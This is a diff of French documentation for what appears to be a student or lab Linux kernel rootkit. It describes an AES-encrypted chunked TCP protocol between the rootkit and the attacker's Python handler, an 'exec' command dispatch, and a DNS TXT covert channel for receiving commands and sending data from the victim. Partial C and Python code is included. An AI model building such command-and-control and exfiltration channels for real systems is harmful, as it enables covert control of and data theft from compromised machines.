@@ -5,23 +5,32 @@
 
 ## 2. 🤝 TCP
 
-## 2.1 🧠 Introductions à nos problématiques
+### 2.1 🧠 Introduction à nos problématiques
 
-Dans un objectif de sécuriser nos communications réseau, nous avons fait le choix d'utiliser le chiffrement AES-128 pour toutes les données échangées entre le client et le serveur. Cependant, le défaut de cet algorithme est qu'il ne permet pas de transmettre des données de taille arbitraire. En effet, le chiffrement AES-128 produit un bloc de 16 octets, ce qui signifie que les données doivent être découpées en blocs de cette taille avant d'être chiffrées.
+Dans l’objectif de sécuriser nos communications réseau, nous avons fait le choix d'utiliser le chiffrement AES-128 pour toutes les données échangées entre le client et le serveur. Cependant, le défaut de cet algorithme est qu'il ne permet pas de transmettre des données de taille arbitraire. En effet, le chiffrement AES-128 produit un bloc de 16 octets, ce qui signifie que les données doivent être découpées en blocs de cette taille avant d'être chiffrées.
 
 Or, lors de la transmission de données via un socket, il est courant que les données soient de taille variable, ce qui pose un problème pour le chiffrement. Il en est bien sûr de même pour les données reçues, qui peuvent être de taille variable et ne pas correspondre à un multiple de 16 octets.
 
-Pour résoudre ce problème, nous avons mis en place un protocole personnalisé de transmission chunkée. Ce protocole permet de découper les données en chunks de taille fixe, chacun étant enrichi d'un en-tête (non-chiffré) pour l'identification, la reconstruction et la détection des erreurs. Ainsi, même si les données sont de taille variable, elles peuvent être découpées en chunks de taille fixe, ce qui permet de les chiffrer et de les transmettre de manière fiable.
+Pour résoudre ce problème, nous avons mis en place un protocole personnalisé de transmission chunkée. Ce protocole permet de découper les données en chunks de taille fixe, chacun étant enrichi d'un en-tête (non chiffré) pour l'identification, la reconstruction et la détection des erreurs. Ainsi, même si les données sont de taille variable, elles peuvent être découpées en chunks de taille fixe, ce qui permet de les chiffrer et de les transmettre de manière fiable.
 
-## 2.2 📦 Protocole personnalisé de transmission chunkée
+### 2.2 📦 Protocole personnalisé de transmission chunkée
 
-### Objectif
+#### Constantes importantes
+
+| Constante         | Valeur par défaut  | Description                                |
+|------------------|------------------|--------------------------------------------|
+| `STD_BUFFER_SIZE`| 1024             | Taille fixe des buffers utilisés           |
+| `CHUNK_OVERHEAD` | 11               | 10 (header) + 1 (EOT_CODE)                 |
+| `EOT_CODE`       | `0x04`           | Code ASCII pour "End of Transmission"      |
+
+
+#### Objectif
 
 Ce protocole personnalisé permet de transmettre de manière fiable des données de taille arbitraire (texte ou fichiers) entre un client et un serveur via un socket noyau. Les données sont **chiffrées** puis **découpées en chunks fixes**, chacun enrichi d’un en-tête pour l’identification, la reconstruction et la détection des erreurs.
 
-### Structure Générale d’un Chunk
+#### Structure Générale d’un Chunk
 
-Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` (de valeur 1024 par défaut) octets structuré comme suit :
+Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` octets structuré comme suit :
 
 ```
 +-------------------+-------------------+-------------------+-------------------------------+------------+
@@ -29,7 +38,7 @@ Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` (de valeur 1024
 +-------------------+-------------------+-------------------+-------------------------------+------------+
 ```
 
-### Champs :
+#### Champs :
 
 | Champ         | Taille     | Description                                                                 |
 |---------------|------------|-----------------------------------------------------------------------------|
@@ -42,7 +51,7 @@ Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` (de valeur 1024
 
 > 🔒 **Toutes les données envoyées dans le payload sont chiffrées avant le découpage en chunks.**
 
-### Fonctionnement de l’Envoi
+#### Fonctionnement de l’Envoi
 
 1. **Chiffrement :** La donnée brute est chiffrée avec AES-128 via `encrypt_buffer`.
 2. **Découpage :** Le buffer chiffré est segmenté en chunks de `BODY_SIZE` (= `STD_BUFFER_SIZE - 11 (HEADER_SIZE + FOOTER_SIZE)`).
@@ -53,7 +62,7 @@ Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` (de valeur 1024
   - Le marqueur `EOT_CODE` à la fin des données
 4. **Envoi :** Chaque chunk est envoyé via `kernel_sendmsg`.
 
-### Fonctionnement de la Réception
+#### Fonctionnement de la Réception
 
 1. **Lecture progressive :**
   - Lecture de l'en-tête (10 octets).
@@ -69,32 +78,128 @@ Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` (de valeur 1024
   - Recopie les données à la bonne position.
   - Attend la réception de tous les chunks.
 4. **Déchiffrement :** Une fois tous les chunks reçus, assemble et déchiffre les données avec l'algorithme AES-128.
-5. **Dispatch :**
+5. **Traitement du message reçu :**
   - Si la donnée commence par `exec`, la traite comme commande texte.
   - Si un transfert de fichier est en cours, les données reçues sont gérées par la partie de transfert de fichiers.
   - Sinon, elle est copiée vers le tampon utilisateur.
 
-### Points forts de ce protocole personnalisé
+#### Points forts de ce protocole personnalisé
 
 - **Fiabilité :** Chaque chunk contient des méta-informations pour la vérification de cohérence.
-- **Idempotence :** Les chunks sont gérés de sorte à ce que les doublons ne posent pas de soucis (copie directe des données dans un tableau en utilisant l'index de chunk).
-- **Taille arbitraire :** Le protocole supporte des messages de taille importante.
+- **Idempotence :** Les chunks sont gérés de sorte à ce que les doublons ne posent pas de souci (copie directe des données dans un tableau en utilisant l'index de chunk).
+- **Taille arbitraire :** Le protocole supporte l'envoi de messages faisant jusqu'à 4 To.
 - **Sécurité :** Tous les transferts sont chiffrés.
 - **Flexibilité :** Gère à la fois les transferts de texte brut et de fichiers binaires.
 
-### Limitations
+#### Limitations
 
 - Le protocole ne gère pas les retransmissions : il suppose que les sockets sont fiables ou que les erreurs de transmission sont gérées par le protocole TCP sous-jacent.
 - Aucun checksum n’est intégré pour vérifier l'intégrité après chiffrement.
 - Le temps d’attente pour recevoir tous les chunks n’est pas limité (peut bloquer indéfiniment).
 
-### Constantes importantes
+### 2.3 🛠️ Implémentation en C et Python
+Le protocole personnalisé de transmission chunkée est implémenté dans les fichiers `network.c` (pour le rootkit) et le fichier `AESNetworkHandler.py` (pour l'attaquant). Voici un aperçu des principales fonctions :
+Les fonctions principales du protocole chunké sont :
 
-| Constante         | Valeur par défaut  | Description                                |
-|------------------|------------------|--------------------------------------------|
-| `STD_BUFFER_SIZE`| 1024             | Taille fixe des buffers utilisés           |
-| `CHUNK_OVERHEAD` | 11               | 10 (header) + 1 (EOT_CODE)                 |
-| `EOT_CODE`       | `0x04`           | Code ASCII pour "End of Transmission"      |
+- `send_to_server_raw(const char *data, size_t len)` :
+  Cette fonction chiffre les données à envoyer, les découpe en chunks de taille fixe, ajoute un en-tête à chaque chunk (nombre total de chunks, index, taille utile, marqueur de fin), puis les envoie un à un via le socket noyau.  
+  Exemple simplifié :
+
+  ```c
+  // Encrypt the data before sending
+  if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0)
+        return -EIO;
+
+  // [... Calculate number of chunks and max chunk body size...]
+
+  // Send each chunk separately
+  for (i = 0; i < nb_chunks; ++i) {
+      // Construction of the header 
+      // total_chunks in big-endian 32 bits
+      uint32_t tc = (uint32_t)nb_chunks;
+      chunk[0] = (uint8_t)((tc >> 24) & 0xFF);
+      chunk[1] = (uint8_t)((tc >> 16) & 0xFF);
+      chunk[2] = (uint8_t)((tc >> 8) & 0xFF);
+      chunk[3] = (uint8_t)((tc >> 0) & 0xFF);
+
+      // chunk_index in big-endian 32 bits
+      uint32_t ci = (uint32_t)i;
+      chunk[4] = (uint8_t)((ci >> 24) & 0xFF);
+      chunk[5] = (uint8_t)((ci >> 16) & 0xFF);
+      chunk[6] = (uint8_t)((ci >> 8) & 0xFF);
+      chunk[7] = (uint8_t)((ci >> 0) & 0xFF);
+
+      // chunk_len in big-endian 16 bits
+      uint16_t cl = (uint16_t)chunk_len;
+      chunk[8] = (uint8_t)((cl >> 8) & 0xFF);
+      chunk[9] = (uint8_t)((cl >> 0) & 0xFF);
+
+      // Copy the encrypted message into the chunk
+      memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);
+
+      // Add the EOT_CODE at the end
+      chunk[10 + chunk_len] = EOT_CODE;
+      
+      // [... Send the chunk via kernel_sendmsg ...]
+  }
+  ```
+
+- `receive_from_server(char *buffer, size_t max_len)` :  
+  Cette fonction lit les données reçues depuis le socket noyau, lit chaque chunk, vérifie son en-tête, assemble les données dans un tampon de réception, et déchiffre le message complet une fois tous les chunks reçus. Ce ne sont finalement que les opérations inverses de `send_to_server_raw`.
+  Voici l'exemple de l'implémentation analogue en python (présente dans `AESNetworkHandler.py`) :
+  ```python
+  def receive(self, sock: socket.socket) -> str | bool:
+        # buffer containing the full received message
+        buffer = bytearray()
+        # List to track received chunks (initialized with first received chunk)
+        received_chunks = None
+        # Total number of chunks to expect (initialized with first received chunk)
+        total_chunks = None
+
+        while True:
+            head = # [... Read the header (10 bytes) from the socket ...]
+
+            total_chunks_read = (
+                (head[0] << 24) |
+                (head[1] << 16) |
+                (head[2] << 8)  |
+                (head[3] << 0)
+            )
+            chunk_index = (
+                (head[4] << 24) |
+                (head[5] << 16) |
+                (head[6] << 8)  |
+                (head[7] << 0)
+            )
+            chunk_len = (head[8] << 8) | head[9]
+
+            needed = self._header_size + chunk_len + 1
+            if needed > self._buffer_size:
+                print(f"[RECEIVE ERROR] chunk_len {chunk_len} inconsistent (need {needed} > {self._buffer_size})")
+                return False
+
+            # Read payload plus EOT
+            payload_plus_eot = self._recv_exact(sock, chunk_len + 1)
+            
+            # [... Check payload and EOT code validity ...]
+
+            # Initialize tracking on the first chunk
+            if total_chunks is None:
+                received_chunks = [False] * total_chunks_read
+
+            # [... Check chunk_index validity (prevent out of bounds) ...]
+
+            # [... Construct the full ciphered message ...]
+
+            # Mark this chunk as received
+            received_chunks[chunk_index] = True
+
+            # If all chunks are received, break
+            if all(received_chunks):
+                break
+
+        return # [...decrypted full message...]
+  ```
 
 ## 3. 🧭 DNS
 
@@ -169,7 +274,7 @@ Le champ **QNAME** représente le nom de domaine demandé. En DNS, il est encod�
 [00]                                        // Terminaison du QNAME
 ```
 
-Concernant le **QTYPE**, deux possibilités existent selon l’appel de la fonction qui construit le paquet : soit 1 pour une requête de type **A** (adresse IPv4), soit 16 pour une requête de type **TXT** (texte). À ce stade, la section *Question* du paquet est complète : *header* (12 octets) + **QNAME** (labels + 0x00) + **QTYPE** (2 octets) + **QCLASS** (2 octets). **QCLASS** le type de réseau ou de protocole pour lequel la requête DNS est faite (1 pour internet ici). On a donc bien finalement la requête DNS brute à envoyer.
+Concernant le **QTYPE**, deux possibilités existent selon l’appel de la fonction qui construit le paquet : soit 1 pour une requête de type **A** (adresse IPv4), soit 16 pour une requête de type **TXT** (texte). À ce stade, la section *Question* du paquet est complète : *header* (12 octets) + **QNAME** (labels + 0x00) + **QTYPE** (2 octets) + **QCLASS** (2 octets). **QCLASS** est le type de réseau ou de protocole pour lequel la requête DNS est faite (1 pour internet ici). On a donc bien finalement la requête DNS brute à envoyer.
 
 #### 3.2.3 Socket
 ```c
@@ -209,7 +314,7 @@ La création de la socket et l'envoi du message sont ensuite assez classiques :
 
 #### 3.2.4 Réponse
 
-Toujours dans la même fonction de dns.c, on reçoit une réponse de manière non bloquante, que l’on enregistre dans les buffer pointés par les paramètres de la fonction. L’interprétation de la réponse est effectuée dans une autre fonction que nous verrons par la suite.
+Toujours dans la même fonction de dns.c, on reçoit une réponse de manière non bloquante, que l’on enregistre dans les buffers pointés par les paramètres de la fonction. L’interprétation de la réponse est effectuée dans une autre fonction que nous verrons par la suite.
 ```c
 iov.iov_base = packet_buffer;
 iov.iov_len = DNS_MAX_BUF;
@@ -255,7 +360,7 @@ static int dns_worker(void *data) {
 }
 ```
 
-#### 3.3.1 Réception
+#### 3.3.2 Réception
 
 L’interprétation de la commande reçue via une requête **TXT** dans le *worker* est assurée par la fonction dns_receive_command(char \*out_buffer, size_t max_length). Comme évoqué précédemment, cette fonction s’appuie sur `dns_send_query`, un *wrapper* générique chargé d’émettre la requête DNS. Une fois la requête envoyée, la victime lit la réponse brute dans le buffer `response_buffer_local`. Elle en extrait ensuite le contenu textuel situé dans la section *Answer TXT* du paquet DNS. La fonction `dns_receive_command` copie cette chaîne dans `cmd_buf` (via le paramètre `out_buffer`) et retourne la longueur du texte extrait.
 ```c
@@ -301,7 +406,66 @@ Pour transmettre des données, la machine victime utilise la fonction dns_send_d
 
 ## 4. 🔒 Chiffrement
 
-## 5.  Améliorations
+Pour garantir la confidentialité des échanges entre le client et le serveur, toutes les données sont chiffrées à l’aide de l’algorithme **AES-128** en mode **CBC** (Cipher Block Chaining). Ce choix assure à la fois une simplicité d’implémentation grâce à l'API de chiffrement du noyau Linux, et une sécurité suffisante pour les besoins de ce projet. Le chiffrement est appliqué à tous les messages échangés, qu’il s’agisse de commandes, de réponses ou de simples données.
+
+#### Principes
+| Élément         | Détail                                                                                                         |
+|-----------------|----------------------------------------------------------------------------------------------------------------|
+| **Clé & IV**    | Clé de chiffrement (`key`) et vecteur d’initialisation (`iv`) de **16 octets** (128 bits), conformément à la [spécification AES-128](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard). |
+| **Mode CBC**    | Le mode CBC introduit une dépendance entre blocs chiffrés, renforçant la sécurité contre certaines attaques.<br>Choisi pour sa simplicité d’implémentation et sa robustesse lors des tests. |
+| **Padding PKCS7** | AES requiert que les données soient un multiple de 16 octets.<br>Le [padding PKCS7](https://en.wikipedia.org/wiki/Padding_%28cryptography%29#PKCS7) complète automatiquement les données et est retiré après déchiffrement. |
+
+#### Implémentation Python
+
+Voici l'implementation Python du chiffrement AES-128-CBC avec padding PKCS7, présente dans le fichier `CryptoHandler.py` :
+
+```python
+
+class CryptoHandler:
+    def __init__(self, key: bytes, iv: bytes):
+        if len(key) != 16 or len(iv) != 16:
+            raise ValueError("The key and IV must be exactly 16 bytes.")
+        self.key = key
+        self.iv = iv
+
+    def encrypt(self, plaintext: str | bytes) -> bytes:
+        if isinstance(plaintext, str):
+            plaintext = plaintext.encode('utf-8')
+        padder = padding.PKCS7(algorithms.AES.block_size).padder()
+        padded_data = padder.update(plaintext) + padder.finalize()
+        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        return encryptor.update(padded_data) + encryptor.finalize()
+
+    def decrypt(self, ciphertext: bytes) -> str:
+        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
+        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
+        data = unpadder.update(padded_data) + unpadder.finalize()
+        return data.decode('utf-8', errors='ignore')
+```
+
+**Points clés de l’implémentation**
+
+- Chiffrement :  
+  1. Conversion éventuelle de la chaîne en bytes.
+  2. Application du padding PKCS7.
+  3. Création d’un objet Cipher en mode CBC.
+  4. Chiffrement des données paddées.
+
+- Déchiffrement :  
+  1. Déchiffrement du ciphertext.
+  2. Suppression du padding PKCS7.
+  3. Décodage en UTF-8.
+```
+
+#### Résumé
+
+- **AES-128-CBC** avec **PKCS7** est utilisé pour tous les échanges.
+- La clé et l’IV sont de 16 octets.
+- Le padding est appliqué avant chiffrement et retiré après déchiffrement.
+- L’implémentation est identique côté Python et C pour garantir l’interopérabilité.
 
 <img 
   src="logo_no_text.png" 
